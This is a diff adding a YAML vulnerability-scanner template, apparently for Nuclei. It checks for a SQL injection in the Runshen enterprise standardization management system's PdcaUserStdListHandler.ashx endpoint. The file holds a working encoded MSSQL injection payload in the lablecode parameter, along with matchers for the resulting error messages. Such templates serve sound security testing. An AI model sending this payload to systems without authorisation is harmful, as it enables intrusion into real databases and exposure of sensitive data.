@@ -1,0 +1,36 @@
+id: poc-yaml-run-shen-information-esms-pdcauserstdlisthandler-ashx-sqli
+info:
+  name: 润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    润申信息企业标准化管理系统存在一个SQL注入漏洞，通过构造特定的SQL语句可以获取敏感信息。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2832%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%2832%29%29%29--+XeuQ&LableName=&page=1&rows=20
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "&nbsp"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
